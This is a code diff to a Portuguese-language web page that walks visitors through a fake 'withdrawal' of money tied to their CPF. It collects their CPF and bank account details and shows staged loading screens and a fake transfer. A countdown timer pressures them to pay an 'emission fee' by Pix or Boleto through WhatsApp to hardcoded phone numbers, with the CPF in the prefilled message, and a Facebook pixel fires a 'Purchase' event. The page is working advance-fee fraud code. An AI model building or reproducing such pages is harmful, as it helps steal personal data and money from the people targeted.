@@ -378,8 +378,8 @@
             let btn = document.getElementById('btn-consultar');
             let err = document.getElementById('cpf-error');
 
-            // Validação flexibilizada para garantir que o botão acenda se tiver 11 dígitos corretos
-            if (cpfLimpo.length === 11 && validarCPF(cpfLimpo)) {
+            // Validação estricta de CPF válido (dígitos verificadores)
+            if (validarCPF(cpfLimpo)) {
                 btn.disabled = false;
                 btn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
                 btn.classList.add('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
@@ -477,3 +477,155 @@
             document.getElementById('step-extrato-1').classList.add('hidden');
             document.getElementById('loading-text').innerText = "Carregando ambiente seguro de repasse...";
             document.getElementById('loading-screen').classList.remove('hidden');
+            subirParaTopo();
+
+            setTimeout(() => {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('step-conta').classList.remove('hidden');
+                subirParaTopo();
+            }, 3000);
+        }
+
+        function validarDadosConta(input) {
+            contaGlobal = input.value.trim();
+            let btn = document.getElementById('btn-pre-sacar');
+            let err = document.getElementById('conta-error');
+
+            if (contaGlobal.length >= 5) {
+                btn.disabled = false;
+                btn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+                btn.classList.add('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
+                err.classList.add('hidden');
+            } else {
+                btn.disabled = true;
+                btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+                btn.classList.remove('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
+                err.classList.add('hidden');
+            }
+        }
+
+        function processarSegundoExtrato() {
+            document.getElementById('step-conta').classList.add('hidden');
+            document.getElementById('loading-text').innerText = "Vinculando dados bancários ao CPF...";
+            document.getElementById('loading-screen').classList.remove('hidden');
+            subirParaTopo();
+
+            setTimeout(() => {
+                document.getElementById('loading-screen').classList.add('hidden');
+                document.getElementById('print-cpf-2').innerText = cpfGlobal;
+                document.getElementById('print-conta-2').innerText = contaGlobal;
+                document.getElementById('valor-encontrado-2').innerText = valorGlobal;
+                document.getElementById('step-extrato-2').classList.remove('hidden');
+                subirParaTopo();
+            }, 3000);
+        }
+
+        function iniciarTransferencia() {
+            document.getElementById('step-extrato-2').classList.add('hidden');
+            document.getElementById('loading-transferencia').classList.remove('hidden');
+            subirParaTopo();
+
+            setTimeout(() => {
+                document.getElementById('loading-transferencia').classList.add('hidden');
+                
+                document.getElementById('print-cpf-3').innerText = cpfGlobal;
+                document.getElementById('print-conta-3').innerText = contaGlobal;
+                document.getElementById('valor-encontrado-3').innerText = valorGlobal;
+                document.getElementById('valor-badge-taxa').innerText = valorGlobal;
+                document.getElementById('valor-badge-detalhe').innerText = valorGlobal;
+
+                document.getElementById('step-taxa').classList.remove('hidden');
+                subirParaTopo();
+                iniciarCronometroTaxa();
+            }, 15000);
+        }
+
+        function iniciarCronometroTaxa() {
+            let tempoTotal = 600;
+            let display = document.getElementById('timer-expiracao');
+
+            let timerInterval = setInterval(() => {
+                let minutos = Math.floor(tempoTotal / 60);
+                let segundos = tempoTotal % 60;
+
+                minutos = minutos < 10 ? "0" + minutos : minutos;
+                segundos = segundos < 10 ? "0" + segundos : segundos;
+
+                display.innerText = minutos + ":" + segundos;
+
+                if (--tempoTotal < 0) {
+                    clearInterval(timerInterval);
+                    display.innerText = "00:00";
+                }
+            }, 1000);
+        }
+
+        function abrirModalConfirmacao() {
+            document.getElementById('modal-check').checked = false;
+            formaPagamentoSelecionada = "";
+            
+            document.getElementById('label-pix').classList.remove('border-brand', 'bg-blue-50');
+            document.getElementById('label-boleto').classList.remove('border-brand', 'bg-blue-50');
+            let radios = document.getElementsByName('forma_pagamento');
+            for(let i=0; i<radios.length; i++) radios[i].checked = false;
+
+            liberarBotaoModal();
+            document.getElementById('modal-whatsapp').classList.remove('hidden');
+        }
+
+        function fecharModalConfirmacao() {
+            document.getElementById('modal-whatsapp').classList.add('hidden');
+        }
+
+        function selecionarFormaPagamento(opcao) {
+            formaPagamentoSelecionada = opcao;
+            let labelPix = document.getElementById('label-pix');
+            let labelBoleto = document.getElementById('label-boleto');
+
+            if (opcao === 'pix') {
+                labelPix.classList.add('border-brand', 'bg-blue-50');
+                labelBoleto.classList.remove('border-brand', 'bg-blue-50');
+            } else {
+                labelBoleto.classList.add('border-brand', 'bg-blue-50');
+                labelPix.classList.remove('border-brand', 'bg-blue-50');
+            }
+            liberarBotaoModal();
+        }
+
+        function liberarBotaoModal() {
+            let marcado = document.getElementById('modal-check').checked;
+            let botaoZap = document.getElementById('modal-btn-zap');
+
+            if (marcado && formaPagamentoSelecionada !== "") {
+                botaoZap.classList.remove('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
+                botaoZap.classList.add('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-md');
+            } else {
+                botaoZap.classList.add('bg-slate-300', 'text-slate-500', 'cursor-not-allowed', 'pointer-events-none');
+                botaoZap.classList.remove('bg-emerald-600', 'hover:bg-emerald-700', 'text-white', 'cursor-pointer', 'animate-pulse', 'shadow-md');
+            }
+        }
+
+        function dispararWhatsApp(event) {
+            let marcado = document.getElementById('modal-check').checked;
+            if (!marcado || formaPagamentoSelecionada === "") {
+                event.preventDefault();
+                return;
+            }
+
+            if (typeof fbq === 'function') {
+                fbq('track', 'Purchase');
+            }
+
+            const numerosWhatsApp = ["5516982192895", "5516982195327"];
+            let numeroSorteado = numerosWhatsApp[Math.floor(Math.random() * numerosWhatsApp.length)];
+
+            let tipoPgtoTexto = formaPagamentoSelecionada === 'pix' ? 'Pix' : 'Boleto';
+            let textoMensagem = `Oi quero pagar a taxa de emissao via ${tipoPgtoTexto}. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
+            let mensagemCodificada = encodeURIComponent(textoMensagem);
+
+            let linkZap = `https://wa.me/${numeroSorteado}?text=${mensagemCodificada}`;
+            event.currentTarget.href = linkZap;
+        }
+    </script>
+</body>
+</html>
